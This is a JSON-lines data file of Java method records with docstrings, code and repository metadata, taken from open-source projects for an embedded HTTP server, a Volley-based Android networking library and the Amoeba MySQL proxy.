{"docstring": "/**\n * \u8c03\u7528\u5bf9\u5e94Controller\u5904\u7406\u4e1a\u52a1\n */\n", "func_signal": "@SuppressWarnings(\"rawtypes\")\nprivate ResultInfo invokController(HttpExchange httpExchange) throws ClassNotFoundException,\n\t\tInstantiationException, IllegalAccessException, IOException, NoSuchMethodException,\n\t\tSecurityException, IllegalArgumentException, InvocationTargetException", "code": "{\n\tString path = httpExchange.getRequestURI().getPath();\n\t\n\tString classPath = Constants.UrlClassMap.get(path.substring(0, path.lastIndexOf(\"/\") + 1));\n\tif (classPath == null || classPath.length() == 0) {\n\t\treturn null;\n\t}\n\tClass controllerClass = Class.forName(classPath);\n\tController controller = (Controller) controllerClass.newInstance();\n\n\tString methodName = path.substring(path.lastIndexOf(\"/\") + 1, path.lastIndexOf(\".\"));\n\t//\u901a\u8fc7\u53cd\u5c04\u83b7\u53d6\u5bf9\u5e94\u65b9\u6cd5\n\tAnnocationHandler annocationHandler = new AnnocationHandler();\n\tMethod method = annocationHandler.getMethod(controllerClass, methodName);\n\t\n\tMap<String, Object> map = null; // \u53c2\u6570\n\t// \u5224\u65ad\u8868\u5355\u7c7b\u578b\uff0c\u82e5\u662fmultipart/form-data\uff0c\u5219\u662f\u6587\u4ef6\u4e0a\u4f20\uff1b\u5426\u5219\u505a\u666e\u901a\u5904\u7406\n\tHeaders headers = httpExchange.getRequestHeaders();\n\t// \u83b7\u53d6ContentType\n\tString contentType = \"\";\n\tif(null != headers.get(\"Content-type\")){\n\t\tcontentType = headers.get(\"Content-type\").toString().replace(\"[\", \"\")\n\t\t\t\t.replace(\"]\", \"\");\n\t}\n\t\n\tif (contentType.indexOf(\"multipart/form-data\") != -1) {\n\t\t// \u83b7\u53d6content\u957f\u5ea6\n\t\tint length = Integer.parseInt(headers.get(\"Content-length\").toString().replace(\"[\", \"\")\n\t\t\t\t.replace(\"]\", \"\"));\n\t\tmap = FileUploadContentAnalysis.parse(httpExchange.getRequestBody(), contentType,\n\t\t\t\tlength);\n\t} else {\n\t\tmap = analysisParms(httpExchange);\n\t}\n\n\t// \u8bbe\u7f6esession\n\tHttpSession httpSession = ApplicationContext.getApplicationContext().getSession(\n\t\t\thttpExchange);\n\tmap.put(\"session\", httpSession);\n\n\treturn (ResultInfo) method.invoke(controller, new Object[] { map });\n}", "path": "src\\main\\java\\org\\eh\\core\\http\\EHHttpHandler.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u54cd\u5e94\u8bf7\u6c42\uff0c\u8fd4\u56de\u9759\u6001\u8d44\u6e90\n * @param httpExchange\n * @param code\n * @param bytes\n * @throws IOException\n */\n", "func_signal": "private void responseStaticToClient(HttpExchange httpExchange, Integer code, byte[] bytes)\n\t\tthrows IOException", "code": "{\n\thttpExchange.sendResponseHeaders(code, bytes.length);\n\tOutputStream out = httpExchange.getResponseBody();\n\tout.write(bytes);\n\tout.flush();\n\thttpExchange.close();\n}", "path": "src\\main\\java\\org\\eh\\core\\http\\EHHttpHandler.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u8c03\u7528ViewHandler\u6e32\u67d3\u89c6\u56fe\n */\n", "func_signal": "private String invokViewHandler(ResultInfo resultInfo) throws IOException", "code": "{\n\tViewHandler viewHandler = new ViewHandler();\n\t// return viewHandler.processView(resultInfo);\n\treturn viewHandler.processVelocityView(resultInfo);\n}", "path": "src\\main\\java\\org\\eh\\core\\http\\EHHttpHandler.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u89e3\u6790velocity\u8def\u5f84\uff08\u6839\u636eController\u8fd4\u56deResultInfo\u7684view\uff09\n */\n", "func_signal": "private String analysisVelocityViewPath(String viewPath)", "code": "{\n\tString path = Constants.VIEW_BASE_PATH + \"/\"\n\t\t\t+ viewPath.replace(ReturnType.velocity.name() + \":\", \"\") + \".vm\";\n\treturn path;\n}", "path": "src\\main\\java\\org\\eh\\core\\web\\view\\ViewHandler.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u54cd\u5e94\u8bf7\u6c42\n * @param httpExchange \u8bf7\u6c42-\u54cd\u5e94\u7684\u5c01\u88c5\n * @param code \u8fd4\u56de\u72b6\u6001\u7801\n * @param msg \u8fd4\u56de\u4fe1\u606f\n * @throws IOException\n */\n", "func_signal": "private void responseToClient(HttpExchange httpExchange, Integer code, String msg)\n\t\tthrows IOException", "code": "{\n\n\tswitch (code) {\n\tcase 200: { // \u6210\u529f\n\t\tbyte[] bytes = msg.getBytes();\n\t\thttpExchange.sendResponseHeaders(code, bytes.length);\n\t\tOutputStream out = httpExchange.getResponseBody();\n\t\tout.write(bytes);\n\t\tout.flush();\n\t\thttpExchange.close();\n\t}\n\t\tbreak;\n\tcase 302: { // \u8df3\u8f6c\n\t\tHeaders headers = httpExchange.getResponseHeaders();\n\t\theaders.add(\"Location\", msg);\n\t\thttpExchange.sendResponseHeaders(code, 0);\n\t\thttpExchange.close();\n\t}\n\t\tbreak;\n\tcase 404: { // \u9519\u8bef\n\t\tbyte[] bytes = \"\".getBytes();\n\t\thttpExchange.sendResponseHeaders(code, bytes.length);\n\t\tOutputStream out = httpExchange.getResponseBody();\n\t\tout.write(bytes);\n\t\tout.flush();\n\t\thttpExchange.close();\n\t}\n\t\tbreak;\n\tdefault:\n\t\tbreak;\n\t}\n}", "path": "src\\main\\java\\org\\eh\\core\\http\\EHHttpHandler.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u83b7\u53d6session\n */\n", "func_signal": "public HttpSession getSession(HttpExchange httpExchange)", "code": "{\n\tString sessionId = getSessionId(httpExchange);\n\tif (StringUtil.isEmpty(sessionId)) {\n\t\treturn null;\n\t}\n\tHttpSession httpSession = ApplicationContextHolder.instance.sessionMap.get(sessionId);\n\tif (null == httpSession) {\n\t\thttpSession = new HttpSession();\n\t\tApplicationContextHolder.instance.sessionMap.put(sessionId, httpSession);\n\t}\n\treturn httpSession;\n}", "path": "src\\main\\java\\org\\eh\\core\\http\\ApplicationContext.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * \u5904\u7406View\u6a21\u677f,\u53ea\u63d0\u4f9b\u5efa\u5355\u53d8\u91cf(\u683c\u5f0f${XXX})\u66ff\u6362,\u5df2\u5e9f\u5f03\n * @return\n */\n", "func_signal": "@Deprecated\npublic String processView(ResultInfo resultInfo)", "code": "{\n\t// \u83b7\u53d6\u8def\u5f84\n\tString path = analysisViewPath(resultInfo.getView());\n\tString content = \"\";\n\tif (IOUtil.isExist(path)) {\n\t\tcontent = IOUtil.readFile(path);\n\t}\n\n\tif (StringUtil.isEmpty(content)) {\n\t\treturn \"\";\n\t}\n\n\t// \u66ff\u6362\u6a21\u677f\u4e2d\u7684\u53d8\u91cf\uff0c\u66ff\u6362\u7b26\u683c\u5f0f\uff1a${XXX}\n\tfor (String key : resultInfo.getResultMap().keySet()) {\n\t\tString temp = \"\";\n\t\tif (null != resultInfo.getResultMap().get(key)) {\n\t\t\ttemp = resultInfo.getResultMap().get(key).toString();\n\t\t}\n\t\tcontent = content.replaceAll(\"\\\\$\\\\{\" + key + \"\\\\}\", temp);\n\t}\n\n\treturn content;\n}", "path": "src\\main\\java\\org\\eh\\core\\web\\view\\ViewHandler.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "//\u6700\u5927\u6587\u4ef6\u957f\u5ea6\n", "func_signal": "public static Map<String, Object> parse(InputStream ins, String contentType, int totalLength)\n\t\t\tthrows IOException", "code": "{\n\n\t\tFileInfo fileInfo =new FileInfo();\n\t\tString fieldname = \"\"; // \u8868\u5355\u57df\u7684\u540d\u79f0\n\t\tString fieldvalue = \"\"; // \u8868\u5355\u57df\u7684\u503c\n\t\tString filename = \"\"; // \u6587\u4ef6\u540d\n\t\tString boundary = \"\"; // \u5206\u754c\u7b26\n\t\tString lastboundary = \"\"; // \u7ed3\u675f\u7b26\n\t\tString filefieldname = \"\"; // \u6587\u4ef6\u8868\u5355\u57df\u540d\n\t\tMap<String, Object> formfields = new HashMap<String, Object>();\n\t\tint filesize = 0; // \u6587\u4ef6\u957f\u5ea6\n\n\t\tint pos = contentType.indexOf(\"boundary=\");\n\n\t\tif (pos != -1) { // \u53d6\u5f97\u5206\u754c\u7b26\u548c\u7ed3\u675f\u7b26\n\t\t\tpos += \"boundary=\".length();\n\t\t\tboundary = \"--\" + contentType.substring(pos);\n\t\t\tlastboundary = boundary + \"--\";\n\t\t}\n\t\tint state = NONE;\n\t\t// \u5f97\u5230\u6570\u636e\u8f93\u5165\u6d41reqbuf\n\t\tDataInputStream in = new DataInputStream(ins);\n\t\t// \u5c06\u8bf7\u6c42\u6d88\u606f\u7684\u5b9e\u4f53\u9001\u5230b\u53d8\u91cf\u4e2d\n\t\tint totalBytes = totalLength;\n\t\tif (totalBytes > MXA_SEGSIZE) {// \u6bcf\u6279\u5927\u4e8e10m\u65f6\n\t\t\treturn null;\n\t\t}\n\t\tbyte[] b = new byte[totalBytes];\n\t\tin.readFully(b);\n\t\tin.close();\n\t\tString reqContent = new String(b, \"UTF-8\");//\n\t\tBufferedReader reqbuf = new BufferedReader(new StringReader(reqContent));\n\n\t\tboolean flag = true;\n\t\twhile (flag == true) {\n\t\t\tString s = reqbuf.readLine();\n\t\t\tif ((s == null) || (s.equals(lastboundary)))\n\t\t\t\tbreak;\n\n\t\t\tswitch (state) {\n\t\t\tcase NONE:\n\t\t\t\tif (s.startsWith(boundary)) {\n\t\t\t\t\tstate = DATAHEADER;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase DATAHEADER:\n\t\t\t\tpos = s.indexOf(\"filename=\");\n\t\t\t\tif (pos == -1) { // \u5c06\u8868\u5355\u57df\u7684\u540d\u5b57\u89e3\u6790\u51fa\u6765\n\t\t\t\t\tpos = s.indexOf(\"name=\");\n\t\t\t\t\tpos += \"name=\".length() + 1;\n\t\t\t\t\ts = s.substring(pos);\n\t\t\t\t\tint l = s.length();\n\t\t\t\t\ts = s.substring(0, l - 1);\n\t\t\t\t\tfieldname = s;\n\t\t\t\t\tstate = FIELDDATA;\n\t\t\t\t} else {\n\t\t\t\t\tString temp = s;\n\t\t\t\t\t// \u5c06\u6587\u4ef6\u8868\u5355\u53c2\u6570\u540d\u89e3\u6790\u51fa\u6765\n\t\t\t\t\tpos = s.indexOf(\"name=\");\n\t\t\t\t\tpos += \"name=\".length() + 1;\n\t\t\t\t\ts = s.substring(pos);\n\t\t\t\t\tint pos1 = s.indexOf(\"\\\";\");\n\t\t\t\t\tfilefieldname = s.substring(0, pos1);\n\n\t\t\t\t\t// \u5c06\u6587\u4ef6\u540d\u89e3\u6790\u51fa\u6765\n\t\t\t\t\tpos = s.indexOf(\"filename=\");\n\t\t\t\t\tpos += \"filename=\".length() + 1;\n\t\t\t\t\ts = s.substring(pos);\n\t\t\t\t\tint l = s.length();\n\t\t\t\t\ts = s.substring(0, l - 1);// \u53bb\u6389\u6700\u540e\u90a3\u4e2a\u5f15\u53f7\u201d\n\t\t\t\t\tpos = s.lastIndexOf(\"\\\\\");\n\t\t\t\t\ts = s.substring(pos + 1);\n\t\t\t\t\tfilename = s;\n\t\t\t\t\t// \u4ece\u5b57\u8282\u6570\u7ec4\u4e2d\u53d6\u51fa\u6587\u4ef6\u6570\u7ec4\n\t\t\t\t\tpos = byteIndexOf(b, temp, 0);\n\t\t\t\t\tb = subBytes(b, pos + temp.getBytes().length + 2, b.length);// \u53bb\u6389\u524d\u9762\u7684\u90e8\u5206\n\t\t\t\t\tint n = 0;\n\t\t\t\t\t/**\n\t\t\t\t\t * \u8fc7\u6ee4boundary\u4e0b\u5f62\u5982 Content-Disposition: form-data; name=\"bin\"; filename=\"12.pdf\" Content-Type:\n\t\t\t\t\t * application/octet-stream Content-Transfer-Encoding: binary \u7684\u5b57\u7b26\u4e32\n\t\t\t\t\t */\n\t\t\t\t\twhile ((s = reqbuf.readLine()) != null) {\n\t\t\t\t\t\tif (n == 1)\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tif (s.equals(\"\"))\n\t\t\t\t\t\t\tn++;\n\n\t\t\t\t\t\tb = subBytes(b, s.getBytes().length + 2, b.length);\n\t\t\t\t\t}\n\t\t\t\t\tpos = byteIndexOf(b, boundary, 0);\n\t\t\t\t\tif (pos != -1)\n\t\t\t\t\t\tb = subBytes(b, 0, pos - 1);\n\n\t\t\t\t\tfilesize = b.length - 1;\n\t\t\t\t\tstate = FILEDATA;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase FIELDDATA:\n\t\t\t\ts = reqbuf.readLine();\n\t\t\t\tfieldvalue = s;\n\t\t\t\tformfields.put(fieldname, fieldvalue);\n\t\t\t\tstate = NONE;\n\t\t\t\tbreak;\n\t\t\tcase FILEDATA:\n\t\t\t\twhile ((!s.startsWith(boundary)) && (!s.startsWith(lastboundary))) {\n\t\t\t\t\ts = reqbuf.readLine();\n\t\t\t\t\tif (s.startsWith(boundary)) {\n\t\t\t\t\t\tstate = DATAHEADER;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tfileInfo.setFieldname(filefieldname);\n\t\tfileInfo.setBytes(b);\n\t\tfileInfo.setFilename(filename);\n\t\tfileInfo.setLength(filesize);\n\t\tformfields.put(filefieldname, fileInfo);\n\t\treturn formfields;\n\n\t}", "path": "src\\main\\java\\org\\eh\\core\\util\\FileUploadContentAnalysis.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "// \u5b57\u8282\u6570\u7ec4\u4e2d\u7684INDEXOF\u51fd\u6570\uff0c\u4e0eSTRING\u7c7b\u4e2d\u7684INDEXOF\u7c7b\u4f3c\n", "func_signal": "public static int byteIndexOf(byte[] b, byte[] s, int start)", "code": "{\n\tint i;\n\tif (s.length == 0) {\n\t\treturn 0;\n\t}\n\tint max = b.length - s.length;\n\tif (max < 0)\n\t\treturn -1;\n\tif (start > max)\n\t\treturn -1;\n\tif (start < 0)\n\t\tstart = 0;\n\tsearch: for (i = start; i <= max; i++) {\n\t\tif (b[i] == s[0]) {\n\t\t\tint k = 1;\n\t\t\twhile (k < s.length) {\n\t\t\t\tif (b[k + i] != s[k]) {\n\t\t\t\t\tcontinue search;\n\t\t\t\t}\n\t\t\t\tk++;\n\t\t\t}\n\t\t\treturn i;\n\t\t}\n\t}\n\treturn -1;\n}", "path": "src\\main\\java\\org\\eh\\core\\util\\FileUploadContentAnalysis.java", "repo_name": "NotBadPad/easy-httpserver", "stars": 85, "license": "apache-2.0", "language": "java", "size": 537}
{"docstring": "/**\n * Adds an event to this request's event log; for debugging.\n */\n", "func_signal": "public void addMarker(String tag)", "code": "{\n//        Log.i(\"GodNet\",tag);\n    if (VolleyLog.MarkerLog.ENABLED) {\n        mEventLog.add(tag, Thread.currentThread().getId());\n    } else if (mRequestBirthTime == 0) {\n        mRequestBirthTime = SystemClock.elapsedRealtime();\n    }\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Sets the sequence number of this request.  Used by {@link RequestQueue}.\n *\n * @return This Request object to allow for chaining.\n */\n", "func_signal": "public final Request<?> setSequence(int sequence)", "code": "{\n    mSequence = sequence;\n    return this;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Initializes an {@link HttpEntity} from the given {@link HttpURLConnection}.\n * @param connection\n * @return an HttpEntity populated with data from <code>connection</code>.\n */\n", "func_signal": "private static HttpEntity entityFromConnection(HttpURLConnection connection)", "code": "{\n    BasicHttpEntity entity = new BasicHttpEntity();\n    InputStream inputStream;\n    try {\n        inputStream = connection.getInputStream();\n    } catch (IOException ioe) {\n        inputStream = connection.getErrorStream();\n    }\n    entity.setContent(inputStream);\n    entity.setContentLength(connection.getContentLength());\n    entity.setContentEncoding(connection.getContentEncoding());\n    entity.setContentType(connection.getContentType());\n    return entity;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\toolbox\\HurlStack.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Sets the retry policy for this request.\n *\n * @return This Request object to allow for chaining.\n */\n", "func_signal": "public Request<?> setRetryPolicy(RetryPolicy retryPolicy)", "code": "{\n    mRetryPolicy = retryPolicy;\n    return this;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Returns the raw POST or PUT body to be sent.\n *\n * @throws AuthFailureError in the event of auth failure\n */\n", "func_signal": "public byte[] getBody() throws AuthFailureError", "code": "{\n    Map<String, String> params = getParams();\n    if (params != null && params.size() > 0) {\n        return encodeParameters(params, getParamsEncoding());\n    }\n    return null;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * @return The hashcode of the URL's host component, or 0 if there is none.\n */\n", "func_signal": "private static int findDefaultTrafficStatsTag(String url)", "code": "{\n    if (!TextUtils.isEmpty(url)) {\n        Uri uri = Uri.parse(url);\n        if (uri != null) {\n            String host = uri.getHost();\n            if (host != null) {\n                return host.hashCode();\n            }\n        }\n    }\n    return 0;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Returns the sequence number of this request.\n */\n", "func_signal": "public final int getSequence()", "code": "{\n    if (mSequence == null) {\n        throw new IllegalStateException(\"getSequence called before setSequence\");\n    }\n    return mSequence;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Constructs a new {@code ByteArrayOutputStream} with a default size of {@code size} bytes. If\n * more than {@code size} bytes are written to this instance, the underlying byte array will\n * expand.\n *\n * @param size initial size for the underlying byte array. The value will be pinned to a default\n *        minimum size.\n */\n", "func_signal": "public PoolingByteArrayOutputStream(ByteArrayPool pool, int size)", "code": "{\n    mPool = pool;\n    buf = mPool.getBuf(Math.max(size, DEFAULT_SIZE));\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\toolbox\\PoolingByteArrayOutputStream.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Forces this dispatcher to quit immediately.  If any requests are still in\n * the queue, they are not guaranteed to be processed.\n */\n", "func_signal": "public void quit()", "code": "{\n    mQuit = true;\n    interrupt();\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\NetworkDispatcher.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Creates a new network dispatcher thread.  You must call {@link #start()}\n * in order to begin processing.\n *\n * @param queue Queue of incoming requests for triage\n * @param network Network interface to use for performing requests\n * @param cache Cache interface to use for writing responses to cache\n * @param delivery Delivery interface to use for posting responses\n */\n", "func_signal": "public NetworkDispatcher(BlockingQueue<Request<?>> queue,\n        Network network, Cache cache,\n        ResponseDelivery delivery)", "code": "{\n    mQueue = queue;\n    mNetwork = network;\n    mCache = cache;\n    mDelivery = delivery;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\NetworkDispatcher.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Set whether or not responses to this request should be cached.\n *\n * @return This Request object to allow for chaining.\n */\n", "func_signal": "public final Request<?> setShouldCache(boolean shouldCache)", "code": "{\n    mShouldCache = shouldCache;\n    return this;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Returns the raw POST body to be sent.\n *\n * @throws AuthFailureError In the event of auth failure\n *\n * @deprecated Use {@link #getBody()} instead.\n */\n", "func_signal": "@Deprecated\npublic byte[] getPostBody() throws AuthFailureError", "code": "{\n    // Note: For compatibility with legacy clients of volley, this implementation must remain\n    // here instead of simply calling the getBody() function because this function must\n    // call getPostParams() and getPostParamsEncoding() since legacy clients would have\n    // overridden these two member functions for POST requests.\n    Map<String, String> postParams = getPostParams();\n    if (postParams != null && postParams.size() > 0) {\n        return encodeParameters(postParams, getPostParamsEncoding());\n    }\n    return null;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Converts <code>params</code> into an application/x-www-form-urlencoded encoded string.\n */\n", "func_signal": "private byte[] encodeParameters(Map<String, String> params, String paramsEncoding)", "code": "{\n    StringBuilder encodedParams = new StringBuilder();\n    try {\n        for (Map.Entry<String, String> entry : params.entrySet()) {\n            encodedParams.append(URLEncoder.encode(entry.getKey(), paramsEncoding));\n            encodedParams.append('=');\n            encodedParams.append(URLEncoder.encode(entry.getValue(), paramsEncoding));\n            encodedParams.append('&');\n        }\n        return encodedParams.toString().getBytes(paramsEncoding);\n    } catch (UnsupportedEncodingException uee) {\n        throw new RuntimeException(\"Encoding not supported: \" + paramsEncoding, uee);\n    }\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Ensures there is enough space in the buffer for the given number of additional bytes.\n */\n", "func_signal": "private void expand(int i)", "code": "{\n    /* Can the buffer handle @i more bytes, if not expand it */\n    if (count + i <= buf.length) {\n        return;\n    }\n    byte[] newbuf = mPool.getBuf((count + i) * 2);\n    System.arraycopy(buf, 0, newbuf, 0, count);\n    mPool.returnBuf(buf);\n    buf = newbuf;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\toolbox\\PoolingByteArrayOutputStream.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Creates a new request with the given method (one of the values from {@link Method}),\n * URL, and error listener.  Note that the normal response listener is not provided here as\n * delivery of responses is provided by subclasses, who have a better idea of how to deliver\n * an already-parsed response.\n */\n", "func_signal": "public Request(int method, String url, Response.ErrorListener listener)", "code": "{\n    mMethod = method;\n    mUrl = url;\n    mErrorListener = listener;\n    setRetryPolicy(new DefaultRetryPolicy());\n\n    mDefaultTrafficStatsTag = findDefaultTrafficStatsTag(url);\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Our comparator sorts from high to low priority, and secondarily by\n * sequence number to provide FIFO ordering.\n */\n", "func_signal": "@Override\npublic int compareTo(Request<T> other)", "code": "{\n    Priority left = this.getPriority();\n    Priority right = other.getPriority();\n\n    // High-priority requests are \"lesser\" so they are sorted to the front.\n    // Equal priorities are sorted by sequence number to provide FIFO ordering.\n    return left == right ?\n            this.mSequence - other.mSequence :\n            right.ordinal() - left.ordinal();\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Set a tag on this request. Can be used to cancel all requests with this\n * tag by {@link RequestQueue#cancelAll(Object)}.\n *\n * @return This Request object to allow for chaining.\n */\n", "func_signal": "public Request<?> setTag(Object tag)", "code": "{\n    mTag = tag;\n    return this;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Opens an {@link HttpURLConnection} with parameters.\n * @param url\n * @return an open connection\n * @throws IOException\n */\n", "func_signal": "private HttpURLConnection openConnection(URL url, Request<?> request) throws IOException", "code": "{\n    HttpURLConnection connection = createConnection(url);\n\n    int timeoutMs = request.getTimeoutMs();\n    connection.setConnectTimeout(timeoutMs);\n    connection.setReadTimeout(timeoutMs);\n    connection.setUseCaches(false);\n    connection.setDoInput(true);\n\n    // use caller-provided custom SslSocketFactory, if any, for HTTPS\n    if (\"https\".equals(url.getProtocol()) && mSslSocketFactory != null) {\n        ((HttpsURLConnection)connection).setSSLSocketFactory(mSslSocketFactory);\n    }\n\n    return connection;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\toolbox\\HurlStack.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Delivers error message to the ErrorListener that the Request was\n * initialized with.\n *\n * @param error Error details\n */\n", "func_signal": "public void deliverError(VolleyError error)", "code": "{\n    if (mErrorListener != null) {\n        mErrorListener.onErrorResponse(error);\n    }\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/**\n * Annotates this request with an entry retrieved for it from cache.\n * Used for cache coherency support.\n *\n * @return This Request object to allow for chaining.\n */\n", "func_signal": "public Request<?> setCacheEntry(Cache.Entry entry)", "code": "{\n    mCacheEntry = entry;\n    return this;\n}", "path": "requestvolley\\src\\main\\java\\com\\jude\\volley\\Request.java", "repo_name": "Jude95/RequestVolley", "stars": 91, "license": "None", "language": "java", "size": 396}
{"docstring": "/* Override this method if you want to customize how the node dumps\n   out its children. */\n", "func_signal": "public void dump(String prefix)", "code": "{\n  System.out.println(toString(prefix));\n  if (children != null) {\n    for (int i = 0; i < children.length; ++i) {\n\tSimpleNode n = (SimpleNode)children[i];\n\tif (n != null) {\n\t  n.dump(prefix + \" \");\n\t}\n    }\n  }\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\sqljep\\SimpleNode.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n * Prints this <code>Throwable</code> and its backtrace to the specified\n * print stream.\n * \n * @param s   <code>PrintStream</code> to use for output\n */\n", "func_signal": "public void printStackTrace(PrintStream s)", "code": "{\n    super.printStackTrace(s);\n\n    if (throwable != null) {\n        s.println(\"with nested exception \" + throwable);\n        throwable.printStackTrace(s);\n    }\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\exception\\AmoebaRuntimeException.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n * Creates a new SQLJEP instance.\n * Store String representation of the expression. <br/>\n * To compile it use {@link #parseExpression} method.<br/>\n * To evaluate use {@link #getValue} method.\n */\n", "func_signal": "public BaseJEP(String exp)", "code": "{\n\tif (exp == null) {\n\t\tthrow new IllegalArgumentException(\"expression can be null\");\n\t}\n\texpression = exp;\n\tnodes = null;\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\sqljep\\BaseJEP.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n * Compares two objects for equality.\n * Two SQLJEPs are equals only when their String representations are equals.\n */\n", "func_signal": "public boolean equals(Object obj)", "code": "{\n\tif (obj instanceof BaseJEP) {\n\t\tBaseJEP f = (BaseJEP)obj;\n\t\treturn expression.equals(f.expression);\n\t}\n\treturn false;\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\sqljep\\BaseJEP.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/** Same behavior as JDK-1.5's Long.valueOf(int) */\n", "func_signal": "public static final Long longValueOf(long l)", "code": "{\n\tif (l >= -128 && l <= 127) {\n\t\treturn LONG_CACHE[(int) l + LONG_CACHE_OFFSET];\n\t}\n\n\treturn new Long(l);\n}", "path": "com.vispractice.amoeba.mysql\\src\\com\\meidusa\\amoeba\\mysql\\io\\Constants.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/** Accept the visitor. **/\n", "func_signal": "public Object childrenAccept(ParserVisitor visitor, Object data) throws ParseException", "code": "{\n  if (children != null) {\n    for (int i = 0; i < children.length; ++i) {\n      children[i].jjtAccept(visitor, data);\n    }\n  }\n  return data;\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\sqljep\\SimpleNode.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
